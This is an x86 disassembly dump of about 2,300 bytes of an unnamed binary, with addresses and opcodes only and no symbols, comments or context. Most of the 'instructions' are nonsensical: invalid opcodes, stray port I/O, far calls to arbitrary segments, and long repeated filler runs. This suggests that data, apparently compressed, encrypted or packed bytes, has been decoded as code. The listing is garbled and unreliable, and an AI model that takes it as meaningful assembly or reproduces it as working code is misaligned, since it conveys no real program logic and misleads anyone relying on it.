  44b0e8:	push   0x44
  44b0ea:	les    eax,FWORD PTR [ebx+0x73]
  44b0ed:	or     al,0xc6
  44b0ef:	sbb    ecx,DWORD PTR [ecx+0x19]
  44b0f2:	les    ebp,FWORD PTR [ebx]
  44b0f4:	imul   eax,DWORD PTR [edi],0x6f0004b1
	...
  44b112:	add    bh,dh
  44b114:	dec    ecx
  44b115:	push   0xfffffffd
  44b117:	adc    al,0x23
  44b119:	push   0x4
  44b11b:	and    al,0x42
  44b11d:	jae    0x44b12b
  44b11f:	sbb    cl,BYTE PTR es:[ecx-0x7]
  44b123:	and    ebp,DWORD PTR [edx]
  44b125:	imul   edx,edi,0x8500053a
  44b12b:	test   DWORD PTR [ecx+0x6a],0x6a2314dd
  44b132:	(bad)
  44b136:	add    BYTE PTR [ecx+0x47],ch
  44b139:	outs   dx,DWORD PTR ds:[si]
  44b13b:	(bad)  
  44b13c:	icebp  
  44b13d:	pop    esp
  44b13e:	inc    ecx
  44b13f:	lea    eax,[esi]
  44b141:	dec    edi
  44b142:	dec    ecx
  44b143:	jae    0x44b116
  44b145:	inc    ebp
  44b146:	inc    ebp
  44b147:	dec    ecx
  44b148:	mov    eax,0x6716c5c
  44b14d:	inc    edi
  44b14e:	dec    esp
  44b14f:	dec    eax
  44b150:	dec    ecx
  44b151:	dec    ebp
  44b152:	push   esp
  44b153:	dec    esi
  44b154:	xchg   esp,eax
  44b155:	es fs cmp edx,0x762ffff
  44b15d:	inc    esi
  44b15e:	fnstenv gs:[ebx+ebp*2]
  44b162:	gs iret 
  44b164:	rcr    BYTE PTR [esp+esi*2+0x4],cl
  44b168:	sti    
  44b169:	pop    ebp
  44b16a:	outs   dx,DWORD PTR ds:[esi]
  44b16b:	dec    ebp
  44b16c:	push   es
  44b16d:	pop    ebp
  44b16e:	add    BYTE PTR [ebx],dl
  44b170:	bnd jae 0x44b1b4
  44b173:	int    0xed
  44b175:	cmp    DWORD PTR [ebp+0x0],esi
	...
  44b190:	mov    ebx,0xdb725cf2
  44b195:	(bad)  
  44b196:	pop    esp
  44b197:	gs or  eax,0xf300f506
  44b19d:	icebp  
  44b19e:	jae    0x44b1f5
  44b1a0:	out    dx,al
  44b1a1:	icebp  
  44b1a2:	imul   eax,DWORD PTR [ebp-0xd],0xd30064e1
  44b1a9:	rcl    DWORD PTR [ebx+0x41],1
  44b1ac:	sub    eax,0xc3322ace
  44b1b1:	icebp  
  44b1b2:	imul   ebp,DWORD PTR [ebp+ecx*8+0x5],0x36
  44b1b7:	add    BYTE PTR [edx],cl
  44b1b9:	bnd jae 0x44b1fd
  44b1bc:	stc    
  44b1bd:	in     eax,0x6f
  44b1bf:	je     0x44b179
  44b1c1:	shr    DWORD PTR [edx+0x41],cl
  44b1c4:	mov    ecx,0xf46569f1
  44b1c9:	scas   al,BYTE PTR es:[edi]
  44b1ca:	das    
  44b1cb:	arpl   WORD PTR [edi],sp
  44b1cd:	pushf  
  44b1ce:	cld    
  44b1cf:	inc    esi
  44b1d0:	inc    esp
  44b1d1:	push   esp
  44b1d2:	xor    BYTE PTR [eax+0x35],dl
  44b1d5:	ins    BYTE PTR es:[edi],dx
  44b1d6:	xor    eax,0x3068302a
  44b1db:	add    ah,dh
  44b1dd:	jns    0x44b1dc
  44b1df:	pop    eax
  44b1e0:	adc    DWORD PTR [esi+0x2e],ebp
  44b1e3:	push   0x13
  44b1e5:	pushf  
  44b1e6:	cld    
  44b1e7:	in     eax,0xf0
  44b1e9:	mov    BYTE PTR [ecx],bl
  44b1eb:	imul   edx,edi,0x6b
  44b1ee:	and    eax,0xfff9f400
  44b1f3:	push   0x0
	...
  44b20d:	fld    DWORD PTR [eax-0x641f9cd1]
  44b213:	cld    
  44b214:	sti    
  44b215:	test   BYTE PTR [edx+0x40c6732c],0x1f
  44b21c:	pop    edi
  44b21d:	sar    BYTE PTR [edi],1
  44b21f:	add    al,0xe7
  44b221:	lock dec eax
  44b223:	sbb    DWORD PTR [ebx-0x69],ebp
  44b226:	shl    BYTE PTR [ebx],1
  44b228:	add    ah,dh
  44b22a:	sub    DWORD PTR [eax],eax
  44b22c:	pop    ecx
  44b22d:	test   eax,0xa369303f
  44b232:	fwait
  44b233:	cld    
  44b234:	jmp    0x44b22e
  44b236:	rcr    BYTE PTR [eax],1
  44b238:	imul   ebx,DWORD PTR [ecx-0xb9cd606],0xffffff97
  44b23f:	stc    
  44b240:	ins    BYTE PTR es:[edi],dx
  44b241:	sub    ch,0x1e
  44b244:	imul   esp,DWORD PTR [esi+ebx*4-0x4],0xffffffe7
  44b249:	lock clc 
  44b24b:	sbb    BYTE PTR [ebx+0x57],ch
  44b24e:	imul   BYTE PTR ds:0xf88ef400
  44b254:	pop    esi
  44b255:	push   esi
  44b256:	mov    edi,esp
  44b258:	fwait
  44b259:	test   DWORD PTR [edx+eax*8],0xca19502e
  44b260:	and    dh,ah
  44b262:	add    al,0x21
  44b264:	add    BYTE PTR [ebp+0x17],cl
  44b267:	(bad)  
  44b268:	adc    eax,0x1ab51525
  44b26d:	push   cs
  44b26e:	sbb    ecx,eax
  44b270:	add    eax,DWORD PTR [eax]
	...
  44b28a:	lods   al,BYTE PTR ds:[esi]
  44b28b:	add    al,0x92
  44b28d:	sub    eax,0x31b71f21
  44b292:	adc    ebx,DWORD PTR [edi]
  44b294:	fwait
  44b295:	sbb    eax,0xff9004f4
  44b29a:	sbb    al,0x18
  44b29c:	fwait
  44b29d:	adc    al,0xdb
  44b29f:	add    al,0x7c
  44b2a1:	xor    dh,ah
  44b2a3:	and    esi,DWORD PTR [ebp+0x2f]
  44b2a6:	push   cs
  44b2a7:	sub    DWORD PTR [ebx-0x76fb0be9],ecx
  44b2ad:	inc    eax
  44b2af:	sub    DWORD PTR [ebx+0x3d],esi
  44b2b2:	shl    DWORD PTR [eax],cl
  44b2b4:	dec    esp
  44b2b5:	xor    al,0xcd
  44b2b7:	sbb    eax,0x12d71849
  44b2bc:	out    0x3,eax
  44b2be:	jnp    0x44b2c4
  44b2c0:	sbb    bl,BYTE PTR [ecx]
  44b2c2:	mov    al,ds:0xb8183c14
  44b2c7:	sub    DWORD PTR [ebp+0x19],eax
  44b2ca:	xchg   ebp,eax
  44b2cb:	xor    edi,DWORD PTR [ebx]
  44b2cd:	push   ss
  44b2ce:	fwait
  44b2cf:	push   ds
  44b2d0:	inc    edx
  44b2d1:	inc    ebp
  44b2d2:	hlt    
  44b2d3:	add    al,0xff
  44b2d5:	pop    es
  44b2d6:	mov    dl,0x18
  44b2d8:	or     edi,DWORD PTR [ecx]
  44b2da:	mov    ss,WORD PTR [edi]
  44b2dc:	add    BYTE PTR [edx],dh
  44b2de:	pop    eax
  44b2df:	add    eax,0x2a3505a7
  44b2e4:	sti    
  44b2e5:	inc    esi
  44b2e6:	addr16 adc esi,ebp
  44b2e9:	sub    BYTE PTR [esi+0x19],cl
  44b2ec:	add    BYTE PTR [ecx],bl
	...
  44b306:	add    dl,ch
  44b308:	sbb    eax,0x21e3045d
  44b30d:	add    BYTE PTR [edx],bh
  44b30f:	in     al,dx
  44b310:	xor    ebp,DWORD PTR [edx-0x2f]
  44b313:	adc    BYTE PTR [ebx],bl
  44b315:	(bad)
  44b319:	inc    ebx
  44b31a:	rcl    edx,1
  44b31c:	and    esi,DWORD PTR [eax-0x43]
  44b31f:	rcr    BYTE PTR ds:0x20c8a76a,1
  44b325:	je     0x44b2f3
  44b327:	jmp    0xfcc8b330
  44b32c:	inc    ecx
  44b32d:	arpl   WORD PTR [ebp-0x7797e544],bx
  44b333:	lds    ebp,FWORD PTR [eax]
  44b335:	ins    BYTE PTR es:[edi],dx
  44b336:	mov    WORD PTR [ebx],ds
  44b338:	inc    esp
  44b339:	js     0x44b2c5
  44b33b:	sbb    al,0x15
  44b33d:	je     0x44b2cf
  44b33f:	sbb    eax,DWORD PTR es:[edx-0x70]
  44b343:	or     ebx,DWORD PTR [ecx]
  44b345:	arpl   WORD PTR [ebx-0x9],di
  44b348:	sub    al,0xff
  44b34a:	lea    ebx,[ecx*1+0x18e84c5d]
  44b351:	pop    ecx
  44b352:	push   ecx
  44b353:	adc    DWORD PTR [ebx],ebx
  44b355:	fs inc ebp
  44b357:	fstp   QWORD PTR [esi]
  44b359:	sub    eax,0x4f7e9
  44b35e:	jmp    0xe944b85a
  44b363:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44b36a:	jmp    0x44b36f
	...
  44b383:	add    bh,dh
  44b385:	add    al,0x0
  44b387:	jmp    0xe944b883
  44b38c:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44b393:	jmp    0x44b88f
  44b398:	int    0x2
  44b39a:	add    BYTE PTR [eax],al
  44b39c:	int    0x2
  44b39e:	add    BYTE PTR [eax],al
  44b3a0:	fld    QWORD PTR [edx]
  44b3a2:	add    BYTE PTR [eax],al
  44b3a4:	fld    QWORD PTR [edx]
  44b3a6:	add    BYTE PTR [eax],al
  44b3a8:	int    0x2
  44b3aa:	add    BYTE PTR [eax],al
  44b3ac:	int    0x2
  44b3ae:	add    BYTE PTR [eax],al
  44b3b0:	popf   
  44b3b1:	add    al,BYTE PTR [eax]
  44b3b3:	add    BYTE PTR [ebp-0x72fffffe],bl
  44b3b9:	add    al,BYTE PTR [eax]
  44b3bb:	add    BYTE PTR [ebp-0x62fffffe],cl
  44b3c1:	add    al,BYTE PTR [eax]
  44b3c3:	add    BYTE PTR [ebp-0x72fffffe],bl
  44b3c9:	add    al,BYTE PTR [eax]
  44b3cb:	add    BYTE PTR [ebp+0x5d000002],cl
  44b3d1:	add    al,BYTE PTR [eax]
  44b3d3:	add    BYTE PTR [ebp+0x2],bl
  44b3d6:	add    BYTE PTR [eax],al
  44b3d8:	dec    ebp
  44b3d9:	add    al,BYTE PTR [eax]
  44b3db:	add    BYTE PTR [ebp+0x2],cl
  44b3de:	add    BYTE PTR [eax],al
  44b3e0:	pop    ebp
  44b3e1:	add    al,BYTE PTR [eax]
  44b3e3:	add    BYTE PTR [ebp+0x2],bl
	...
  44b3fe:	add    BYTE PTR [eax],al
  44b400:	add    BYTE PTR [ebp+0x2],cl
  44b403:	add    BYTE PTR [eax],al
  44b405:	dec    ebp
  44b406:	add    al,BYTE PTR [eax]
  44b408:	add    BYTE PTR ds:0x1d000002,bl
  44b40e:	add    al,BYTE PTR [eax]
  44b410:	add    BYTE PTR ds:0xd000002,cl
  44b416:	add    al,BYTE PTR [eax]
  44b418:	add    BYTE PTR ds:0x1d000002,bl
  44b41e:	add    al,BYTE PTR [eax]
  44b420:	add    BYTE PTR ds:0xd000002,cl
  44b426:	add    al,BYTE PTR [eax]
  44b428:	add    ah,dh
  44b42a:	fwait
  44b42b:	cld    
  44b42c:	push   esp
  44b42e:	fwait
  44b42f:	cld    
  44b430:	push   esp
  44b432:	fwait
  44b433:	cld    
  44b434:	push   esp
  44b436:	fwait
  44b437:	cld    
  44b438:	push   esp
  44b43a:	fwait
  44b43b:	cld    
  44b43c:	push   esp
  44b43e:	fwait
  44b43f:	cld    
  44b440:	push   esp
  44b442:	fwait
  44b443:	cld    
  44b444:	push   esp
  44b446:	fwait
  44b447:	cld    
  44b448:	push   esp
  44b44a:	fwait
  44b44b:	cld    
  44b44c:	push   esp
  44b44e:	fwait
  44b44f:	cld    
  44b450:	push   esp
  44b452:	fwait
  44b453:	cld    
  44b454:	push   esp
  44b456:	fwait
  44b457:	cld    
  44b458:	push   esp
  44b45a:	fwait
  44b45b:	cld    
  44b45c:	push   esp
  44b45e:	fwait
  44b45f:	cld    
  44b460:	push   esp
  44b462:	fwait
  44b463:	cld    
  44b464:	inc    DWORD PTR [eax]
	...
  44b47e:	hlt    
  44b47f:	fwait
  44b480:	cld    
  44b481:	push   esp
  44b483:	fwait
  44b484:	cld    
  44b485:	push   esp
  44b487:	fwait
  44b488:	cld    
  44b489:	push   esp
  44b48b:	fwait
  44b48c:	cld    
  44b48d:	push   esp
  44b48f:	fwait
  44b490:	cld    
  44b491:	push   esp
  44b493:	fwait
  44b494:	cld    
  44b495:	push   esp
  44b497:	fwait
  44b498:	cld    
  44b499:	push   esp
  44b49b:	fwait
  44b49c:	cld    
  44b49d:	push   esp
  44b49f:	fwait
  44b4a0:	cld    
  44b4a1:	push   esp
  44b4a3:	fwait
  44b4a4:	cld    
  44b4a5:	push   esp
  44b4a7:	fwait
  44b4a8:	cld    
  44b4a9:	push   esp
  44b4ab:	fwait
  44b4ac:	cld    
  44b4ad:	push   esp
  44b4af:	fwait
  44b4b0:	cld    
  44b4b1:	push   esp
  44b4b3:	fwait
  44b4b4:	cld    
  44b4b5:	push   esp
  44b4b7:	fwait
  44b4b8:	cld    
  44b4b9:	push   esp
  44b4bb:	add    al,0xe7
  44b4bd:	add    esi,esp
  44b4bf:	add    al,0xe7
  44b4c1:	add    esi,esp
  44b4c3:	add    al,0xe7
  44b4c5:	add    esi,esp
  44b4c7:	add    al,0xe7
  44b4c9:	add    esi,esp
  44b4cb:	add    al,0xe7
  44b4cd:	add    esi,esp
  44b4cf:	add    al,0xe7
  44b4d1:	add    esi,esp
  44b4d3:	add    al,0xe7
  44b4d5:	add    esi,esp
  44b4d7:	add    al,0xe7
  44b4d9:	add    esi,esp
  44b4db:	add    al,0xe7
  44b4dd:	add    esi,esp
  44b4df:	add    al,0xe7
  44b4e1:	add    eax,DWORD PTR [eax]
	...
  44b4fb:	hlt    
  44b4fc:	add    al,0xe7
  44b4fe:	add    esi,esp
  44b500:	add    al,0xe7
  44b502:	add    esi,esp
  44b504:	add    al,0xe7
  44b506:	add    esi,esp
  44b508:	add    al,0xe7
  44b50a:	add    esi,esp
  44b50c:	add    al,0xe7
  44b50e:	add    esi,esp
  44b510:	add    al,0xe7
  44b512:	add    esi,esp
  44b514:	add    al,0xe7
  44b516:	add    esi,esp
  44b518:	add    al,0xe7
  44b51a:	add    esi,esp
  44b51c:	add    al,0xf
  44b51e:	inc    esp
  44b51f:	mov    ah,0x4
  44b521:	aas    
  44b522:	inc    ebp
  44b523:	mov    ah,0x4
  44b525:	call   0xd949a92c
  44b52a:	add    dh,ah
  44b52c:	add    al,0xe2
  44b52e:	add    esi,esp
  44b530:	add    al,0x6f
  44b532:	dec    ebx
  44b533:	mov    ah,0x4
  44b535:	pop    ss
  44b536:	inc    ebx
  44b537:	mov    ah,0x4
  44b539:	out    0x3,eax
  44b53b:	hlt    
  44b53c:	add    al,0xf1
  44b53e:	add    esi,esp
  44b540:	add    al,0xda
  44b542:	add    esi,esp
  44b544:	add    al,0xe7
  44b546:	add    esi,esp
  44b548:	add    al,0x8f
  44b54a:	inc    ebx
  44b54b:	mov    ah,0x4
  44b54d:	add    cl,ch
  44b54f:	test   DWORD PTR [eax+eax*1],0x4f7da
  44b556:	out    dx,al
  44b557:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44b55e:	call   0x44b563
	...
  44b577:	add    bh,dh
  44b579:	add    al,0x0
  44b57b:	pop    ds
  44b57c:	call   0x434c:0xd938b4cb
  44b583:	jmp    0xc944ba7f
  44b588:	cld    
  44b589:	jns    0x44b5a1
  44b58b:	jmp    0xe944ba87
  44b590:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44b597:	jmp    0xe844ba8f
  44b59c:	or     DWORD PTR [eax+edi*8+0x4f7fc],0xfffffff2
  44b5a4:	test   DWORD PTR [eax+eax*1],0x4f7a9
  44b5ab:	test   DWORD PTR cs:[eax+eax*1],0x4f069
  44b5b3:	push   0xf1f88c93
  44b5b8:	test   DWORD PTR [eax+eax*1],0x4f7e1
  44b5bf:	leave  
  44b5c0:	test   DWORD PTR [eax+eax*1],0x4f77e
  44b5c7:	jmp    0xe944bac3
  44b5cc:	test   DWORD PTR [eax+eax*1],0x3889d7e9
  44b5d3:	jmp    0xe944bacf
  44b5d8:	test   DWORD PTR [eax+eax*1],0xe9
	...
  44b5f3:	add    BYTE PTR [eax],al
  44b5f5:	das    
  44b5f6:	push   es
  44b5f7:	inc    eax
  44b5f8:	add    BYTE PTR ds:0x1d000007,cl
  44b5fe:	pop    es
  44b5ff:	add    BYTE PTR [eax],al
  44b601:	sbb    eax,0xd40006d
  44b606:	pop    es
  44b607:	add    BYTE PTR [eax],al
  44b609:	or     eax,0x1d000007
  44b60e:	test   DWORD PTR [eax+eax*2],eax
  44b611:	fld    QWORD PTR [esi]
  44b613:	add    BYTE PTR [eax],al
  44b615:	int    0x6
  44b617:	add    BYTE PTR [eax],al
  44b619:	std    
  44b61a:	lds    eax,FWORD PTR [edi]
  44b61c:	inc    eax
  44b61d:	fld    QWORD PTR [esi]
  44b61f:	add    BYTE PTR [eax],al
  44b621:	fld    QWORD PTR [esi]
  44b623:	add    BYTE PTR [eax],al
  44b625:	mov    ecx,0xcd400a72
  44b62a:	push   es
  44b62b:	add    BYTE PTR [eax],al
  44b62d:	popf   
  44b62e:	push   es
  44b62f:	add    BYTE PTR [eax+0x400f0e2b],al
  44b635:	lea    eax,[esi]
  44b637:	add    BYTE PTR [eax],al
  44b639:	lea    eax,[esi]
  44b63b:	add    BYTE PTR [eax],ah
  44b63d:	adc    DWORD PTR [eax],ebp
  44b63f:	adc    al,BYTE PTR [eax-0x63]
  44b642:	push   es
  44b643:	add    BYTE PTR [eax],al
  44b645:	lea    eax,[edx]
  44b647:	mov    bh,0xc9
  44b649:	idiv   BYTE PTR [edx+0x2c]
  44b64c:	inc    eax
  44b64d:	pop    ebp
  44b64e:	push   es
  44b64f:	add    BYTE PTR [ecx+0x1bc6b9f0],ah
  44b655:	xorps  xmm0,XMMWORD PTR [esi+0x40]
	...
  44b671:	add    BYTE PTR ds:0xcdb59676,ch
  44b677:	sahf   
  44b678:	mov    al,ds:0x618518ad
  44b67d:	inc    eax
  44b67e:	fld    QWORD PTR [ebp+esi*8+0x25]
  44b682:	sub    BYTE PTR [edi+0x5bf44f86],cl
  44b688:	jnp    0x44b6ca
  44b68a:	hlt    
  44b68b:	sub    al,0x72
  44b68d:	ror    BYTE PTR [ecx+0x690309df],1
  44b693:	cmc    
  44b694:	push   0xffffff99
  44b696:	mov    ah,0xc4
  44b698:	pop    edx
  44b699:	lahf   
  44b69a:	mov    al,0xc0
  44b69c:	jl     0x44b6ab
  44b69e:	jae    0x44b6bd
  44b6a0:	jle    0x44b658
  44b6a2:	mov    ah,0x22
  44b6a4:	loopne 0x44b678
  44b6a6:	call   0xbdf4:0xb469a5a
  44b6ad:	int3   
  44b6ae:	xor    al,0x8b
  44b6b0:	ret    0x68df
  44b6b3:	je     0x44b638
  44b6b5:	(bad)  
  44b6b6:	cmp    eax,DWORD PTR [esi+0x6f]
  44b6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b6ba:	xor    eax,0x296480d0
  44b6bf:	ret    
  44b6c0:	aad    0x8a
  44b6c2:	ret    
  44b6c3:	stos   DWORD PTR es:[edi],eax
  44b6c4:	pushf  
  44b6c5:	jnp    0x44b6fd
  44b6c7:	push   0x34ca89b8
  44b6cc:	jns    0x44b6c2
  44b6ce:	(bad)  
  44b6cf:	mov    ecx,0x7d374e66
  44b6d4:	mov    eax,ds:0x71
	...
  44b6ed:	add    BYTE PTR [eax],al
  44b6ef:	xchg   edi,eax
  44b6f0:	xlat   BYTE PTR ds:[ebx]
  44b6f1:	lea    esp,[esi]
  44b6f3:	fist   DWORD PTR [edi]
  44b6f5:	jge    0x44b718
  44b6f7:	cmp    BYTE PTR [esp+esi*8],al
  44b6fa:	adc    BYTE PTR [esi-0x1d],cl
  44b6fd:	imul   ecx,DWORD PTR [edi],0xf5c7e057
  44b703:	mov    al,0x6
  44b705:	arpl   bx,dx
  44b707:	repnz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  44b70a:	fisubr WORD PTR [esi-0x46378e7b]
  44b710:	or     al,0xc0
  44b713:	mov    eax,gs:0xb494a962
  44b719:	lahf   
  44b71a:	pushf  
  44b71b:	mov    dl,0x4
  44b71d:	hlt    
  44b71e:	es add eax,0x758353f9
  44b724:	mulps  xmm1,xmm3
  44b727:	mov    ebx,0x10422f37
  44b72c:	popa   
  44b72d:	push   ebp
  44b72e:	fcmove st,st(0)
  44b730:	iret   
  44b731:	jle    0x44b784
  44b733:	push   ds
  44b734:	xor    eax,0x27166524
  44b739:	in     al,dx
  44b73a:	(bad)  
  44b73b:	sahf   
  44b73c:	int    0x6d
  44b73e:	jge    0x44b6c1
  44b740:	sub    ebx,DWORD PTR [edx+0x4795963e]
  44b746:	jecxz  0x44b6eb
  44b748:	xor    DWORD PTR [edi+ecx*4+0x24],eax
  44b74c:	es cwde 
  44b74e:	sahf   
  44b74f:	js     0x44b77c
  44b751:	outs   dx,BYTE PTR ds:[esi]
  44b752:	mov    ebx,0x0
	...
  44b76b:	add    BYTE PTR [esi],dl
  44b76d:	sub    ah,BYTE PTR [eax-0x66]
  44b770:	test   al,0x20
  44b772:	cmp    eax,0x994c376
  44b777:	pop    ebp
  44b778:	xchg   ecx,eax
  44b779:	mov    ebp,0x172bbebb
  44b77e:	mov    ds:0x67088ca,eax
  44b783:	mov    bl,BYTE PTR [ecx-0x293838ca]
  44b789:	adc    edi,esp
  44b78b:	add    esi,esp
  44b78d:	add    al,0x24
  44b78f:	iret   
  44b790:	scas   al,BYTE PTR es:[edi]
  44b791:	mov    ecx,0xb9afcf1a
  44b796:	xor    cl,bh
  44b798:	push   0xf1de97c8
  44b79d:	scas   eax,DWORD PTR es:[edi]
  44b79e:	inc    ebp
  44b79f:	adc    ebx,DWORD PTR [edi]
  44b7a1:	sti    
  44b7a2:	xor    DWORD PTR [eax+0x63],esp
  44b7a5:	enter  0x279c,0x9
  44b7a9:	test   al,0xa9
  44b7ab:	mov    fs,WORD PTR [edi+edx*1+0x0]
  44b7af:	(bad)  [ebx+edx*4+0x38]
  44b7b3:	sub    al,BYTE PTR [esp+ebx*8+0x305a0062]
  44b7ba:	adc    DWORD PTR [esi-0x46c7689f],edx
  44b7c0:	out    dx,eax
  44b7c1:	jmp    0x455fde49
  44b7c6:	lods   al,BYTE PTR ds:[esi]
  44b7c7:	lods   al,BYTE PTR ds:[esi]
  44b7c8:	xchg   edi,eax
  44b7c9:	popf   
  44b7ca:	cmp    BYTE PTR [ecx],ch
  44b7cc:	xchg   esi,eax
  44b7cd:	push   ebp
  44b7ce:	inc    bp
	...
  44b7e8:	add    BYTE PTR [edi+0x75f6bb02],cl
  44b7ee:	mov    eax,ds:0x4bccda38
  44b7f3:	cmp    eax,0x93b29523
  44b7f8:	push   esi
  44b7f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b7fb:	cmp    BYTE PTR [ebx+0x8c98a7d],ch
  44b801:	je     0x44b7f9
  44b803:	jo     0x44b7b2
  44b805:	pop    ebx
  44b806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b807:	cmp    dh,al
  44b809:	cmp    esi,DWORD PTR [edx]
  44b80b:	fistp  WORD PTR [esp+esi*4]
  44b80e:	dec    ebp
  44b80f:	xchg   ebx,eax
  44b810:	jl     0x44b868
  44b812:	mov    esi,0x38b47b38
  44b817:	xor    eax,0x13bbe3dc
  44b81c:	(bad)  
  44b81d:	sbb    bl,BYTE PTR [ebp+0x38]
  44b820:	daa    
  44b821:	xlat   BYTE PTR ds:[ebx]
  44b822:	dec    esi
  44b823:	xchg   ebx,eax
  44b824:	add    BYTE PTR ds:0xaf78195c,dh
  44b82a:	jae    0x44b864
  44b82c:	add    eax,0x65ddc593
  44b831:	rcl    al,cl
  44b833:	mov    BYTE PTR cs:[edx+0x11],bh
  44b837:	cmp    DWORD PTR [eax-0x7040cfdc],ecx
  44b83d:	sar    BYTE PTR [eax],0x7c
  44b840:	add    BYTE PTR [edi],ch
  44b842:	es pop eax
  44b844:	aas    
  44b845:	loop   0x44b8a1
  44b847:	daa    
  44b848:	lea    edx,[ebx+0x2d]
  44b84b:	mov    eax,DWORD PTR [ebp+0x0]
	...
  44b865:	add    BYTE PTR [eax],ah
  44b867:	data16 cmp al,0x3f
  44b86a:	add    DWORD PTR [ebp+ebx*4+0x2025d4e9],ebp
  44b871:	jmp    0x1ca8:0x3f2318ca
  44b878:	call   0x6d46:0x7be779e4
  44b87f:	dec    esp
  44b880:	dec    ebp
  44b881:	ds scas al,BYTE PTR es:[edi]
  44b883:	out    0xfd,eax
  44b885:	retf   
  44b886:	out    dx,al
  44b887:	aam    0x6e
  44b889:	sbb    DWORD PTR [edx+0x6c3d7a11],0x68
  44b890:	xor    bl,BYTE PTR [ecx]
  44b892:	pop    es
  44b893:	ficomp WORD PTR [ebx+eax*2]
  44b896:	mov    esp,0xbc3ca4c2
  44b89b:	jns    0x44b866
  44b89d:	cmp    BYTE PTR [edi+0x43],bl
  44b8a0:	(bad)  
  44b8a1:	mov    eax,0x3bcf6dcd
  44b8a6:	imul   edi,DWORD PTR [edx+0x50],0xe12ff608
  44b8ad:	jecxz  0x44b8c2
  44b8af:	and    al,0xfc
  44b8b1:	cmp    dl,bl
  44b8b3:	add    eax,0x3492423e
  44b8b8:	xchg   edx,eax
  44b8b9:	jne    0x44b84d
  44b8bb:	inc    edi
  44b8bc:	cmp    cl,BYTE PTR es:[esi-0x112de40f]
  44b8c3:	inc    ebp
  44b8c4:	sub    ch,dh
  44b8c6:	push   esp
  44b8c7:	adc    dl,BYTE PTR [ebx+0x39]
	...
  44b8e2:	add    bl,al
  44b8e4:	xor    BYTE PTR [esi-0x62b75d40],0x82
  44b8eb:	hlt    
  44b8ec:	xor    eax,0xfa26b263
  44b8f1:	and    al,0xae
  44b8f3:	in     eax,0x36
  44b8f5:	xor    ebx,DWORD PTR [ecx+0xf4d64b0]
  44b8fb:	adc    BYTE PTR [ecx+0x4e09e44b],bh
  44b901:	enter  0xc748,0x6d
  44b905:	lds    esp,FWORD PTR [ecx+edx*8+0x16]
  44b909:	xor    eax,0xb55c5804
  44b90e:	mov    ebp,0xc1abb299
  44b913:	repnz sbb eax,0xeeae879f
  44b919:	ins    BYTE PTR es:[edi],dx
  44b91a:	cmp    eax,DWORD PTR [ebx-0x14]
  44b91d:	sbb    BYTE PTR ds:0x634ae5dc,0x56
  44b924:	popa   
  44b925:	or     BYTE PTR [eax+0x7a689d9b],0x5
  44b92c:	js     0x44b90e
  44b92e:	fnstcw WORD PTR [ebx+0x65]
  44b931:	mov    cl,0xc7
  44b933:	clc    
  44b934:	pusha  
  44b935:	pop    ebp
  44b936:	xlat   BYTE PTR ds:[ebx]
  44b937:	(bad)  
  44b938:	fwait
  44b939:	cld    
  44b93a:	push   esp
  44b93c:	dec    DWORD PTR ds:0xe03f440
  44b942:	inc    eax
  44b943:	hlt    
  44b944:	mov    bh,0xe
  44b946:	inc    eax
	...
  44b95f:	add    ah,dh
  44b961:	mov    ebx,0x4ff4400e
  44b966:	push   cs
  44b967:	inc    eax
  44b968:	hlt    
  44b969:	push   ebx
  44b96a:	push   cs
  44b96b:	inc    eax
  44b96c:	hlt    
  44b96d:	addr16 push cs
  44b96f:	inc    eax
  44b970:	hlt    
  44b971:	imul   ecx,DWORD PTR [esi],0x40
  44b974:	hlt    
  44b975:	pop    edi
  44b976:	push   cs
  44b977:	inc    eax
  44b978:	hlt    
  44b979:	arpl   WORD PTR [esi],cx
  44b97b:	inc    eax
  44b97c:	hlt    
  44b97d:	add    al,0xab
  44b97f:	adc    DWORD PTR [esp+eax*1+0x4b411a7],esi
  44b986:	out    0x3,eax
  44b988:	hlt    
  44b989:	add    al,0xe7
  44b98b:	add    esi,esp
  44b98d:	add    al,0xe7
  44b98f:	add    esi,esp
  44b991:	add    al,0xe7
  44b993:	add    esi,esp
  44b995:	add    al,0xe7
  44b997:	add    esi,esp
  44b999:	add    al,0xdf
  44b99b:	fdivr  st(2),st
  44b99d:	add    al,0xe7
  44b99f:	add    esi,esp
  44b9a1:	add    al,0xe7
  44b9a3:	add    esi,esp
  44b9a5:	add    al,0xe7
  44b9a7:	add    esi,esp
  44b9a9:	add    al,0x9d
  44b9ab:	mov    ah,0xd2
  44b9ad:	add    al,0xe7
  44b9af:	add    esi,esp
  44b9b1:	add    al,0xe7
  44b9b3:	add    esi,esp
  44b9b5:	add    al,0xe7
  44b9b7:	add    esi,esp
  44b9b9:	add    al,0x8
  44b9bb:	mov    al,0x32
  44b9bd:	add    eax,0x4f403e7
  44b9c2:	out    0x3,eax
	...
  44b9dc:	add    ah,dh
  44b9de:	add    al,0xe7
  44b9e0:	add    esi,esp
  44b9e2:	add    al,0xf
  44b9e4:	mov    al,0x12
  44b9e6:	add    eax,0x4f403e7
  44b9eb:	out    0x3,eax
  44b9ed:	hlt    
  44b9ee:	add    al,0xe7
  44b9f0:	add    esi,esp
  44b9f2:	add    al,0xcc
  44b9f4:	scas   al,BYTE PTR es:[edi]
  44b9f5:	repnz add al,0xe7
  44b9f8:	add    esi,esp
  44b9fa:	add    al,0xe7
  44b9fc:	add    esi,esp
  44b9fe:	add    al,0xe7
  44ba00:	add    esi,esp
  44ba02:	add    al,0x25
  44ba04:	scas   al,BYTE PTR es:[edi]
  44ba05:	rol    BYTE PTR [edi+eiz*8],cl
  44ba08:	add    esi,esp
  44ba0a:	add    al,0xe7
  44ba0c:	add    esi,esp
  44ba0e:	add    al,0x0
  44ba10:	jmp    0xe444bf0c
  44ba15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ba16:	inc    ebx
  44ba17:	add    cl,ch
  44ba19:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ba20:	jmp    0xa444bf1c
  44ba25:	test   DWORD PTR [ebx+0x0],eax
  44ba28:	jmp    0xe944bf24
  44ba2d:	test   DWORD PTR [eax+eax*1],0x4f7e9
